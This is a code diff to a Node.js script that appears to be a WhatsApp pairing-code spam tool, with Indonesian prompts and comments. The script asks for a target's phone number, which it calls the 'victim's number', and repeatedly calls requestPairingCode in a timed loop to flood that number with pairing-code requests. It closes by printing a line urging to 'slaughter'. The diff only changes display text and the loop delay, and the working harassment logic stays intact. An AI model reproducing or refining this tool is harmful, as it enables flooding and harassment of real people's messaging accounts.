@@ -88,13 +88,13 @@ async function startspam() {
       throw new Error("Lu Pake Kuota Anjg, Sc Gw Tidak Menerima Kuota🤣😂👑");
     }
 
-    console.log(chalk.bgBlack(chalk.yellowBright("𝕷𝖎𝖍𝖃𝖘𝖕𝖆𝖒 𝕻𝖆𝖎𝖗𝖎𝖓𝖌")));
-    let phoneNumber = await question(chalk.bgBlack(chalk.redBright("𝕸𝖆𝖘𝖎𝖐𝖆𝖓 𝕹𝖔𝖒𝖔𝖗 𝕶𝖗𝖔𝖈𝖔 𝕿𝖚𝖆𝖓\n𝕺𝖍𝖍 𝖎𝖓𝖎 𝖓𝖔 𝖐𝖗𝖔𝖈𝖔? : ")));
+    console.log(chalk.bgBlack(chalk.yellowBright("LihX Spampair")));
+    let phoneNumber = await question(chalk.bgBlack(chalk.redBright("Masukan Nomor Kroco\n Ohh ini nomor kroconya? : ")));
     phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
 
     while (!Object.keys(MCC_CODES).some(v => phoneNumber.startsWith(v))) {
-      console.log(chalk.bgBlack(chalk.redBright("𝕸𝖆𝖘𝖚𝖐𝖐𝖆𝖓 𝕹𝖔𝖒𝖔𝖗 𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕 : ")));
-      phoneNumber = await question(chalk.bgBlack(chalk.greenBright("𝕸𝖆𝖘𝖎𝖐𝖆𝖓 𝕹𝖔𝖒𝖔𝖗 𝕶𝖗𝖔𝖈𝖔 𝕿𝖚𝖆𝖓\𝖓𝕺𝖍𝖍 𝖎𝖓𝖎 𝖓𝖔 𝖐𝖗𝖔𝖈𝖔? : ")));
+      console.log(chalk.bgBlack(chalk.redBright("Masukan Nomor Kroco: ")));
+      phoneNumber = await question(chalk.bgBlack(chalk.greenBright("Masukan Nomor Kroco\n Ohh ini nomor kroconya? : ")));
       phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
     }
 
@@ -103,9 +103,9 @@ async function startspam() {
       while (second > 0) {
         let code = await spam.requestPairingCode(phoneNumber);
         code = code?.match(/.{1,4}/g)?.join('-') || code;
-        console.log(chalk.bgBlack(chalk.greenBright("𝕵𝖆𝖓 𝕯𝖎 𝖘𝖙𝖔𝖕👑: " + code)));
+        console.log(chalk.bgBlack(chalk.greenBright("Lanjutkan: " + code)));
         console.log(chalk.bgBlack(chalk.whiteBright("" + second + "")));
-        await new Promise(resolve => setTimeout(resolve, 100));
+        await new Promise(resolve => setTimeout(resolve, 200));
         second--;
       }
       console.log(chalk.bgBlack(chalk.redBright("BANTAI COOY BANTAI")));
